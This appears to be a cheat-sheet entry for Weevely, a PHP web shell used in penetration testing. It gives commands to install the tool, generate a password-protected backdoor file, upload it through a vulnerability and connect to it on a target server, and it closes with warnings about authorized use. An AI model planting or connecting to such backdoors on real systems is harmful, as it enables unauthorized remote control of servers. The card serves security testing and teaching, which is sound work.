Weevely
Weaponized web shell for PHP

Post Exploitation
Description
Weevely is a web shell that simulates a telnet-like connection. It is designed for post-exploitation and stealth persistence.

Installation / Check
Check if installed:

which weevely
Install command:

sudo apt install weevely
Basic Syntax
weevely generate <password> <path>
Common Commands
Command	What it does	When to use	Risk
weevely generate mypassword agent.php

Generate shell	Create backdoor	
weevely http://target.com/agent.php mypassword

Connect to shell	Access uploaded shell	
:system_info

Get system info	Enumerate target	
Step-by-Step Guide
1
Generate agent: weevely generate
2
Upload to target via vulnerability
3
Connect: weevely URL password
4
Run commands or modules
5
Clean up after testing
Understanding the Output
Terminal-like interface. Commands executed on target server.

Important Warnings
•
Creating backdoors is illegal
•
Leaves evidence on server
•
Use only in authorized tests
•
Clean up after engagement
⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
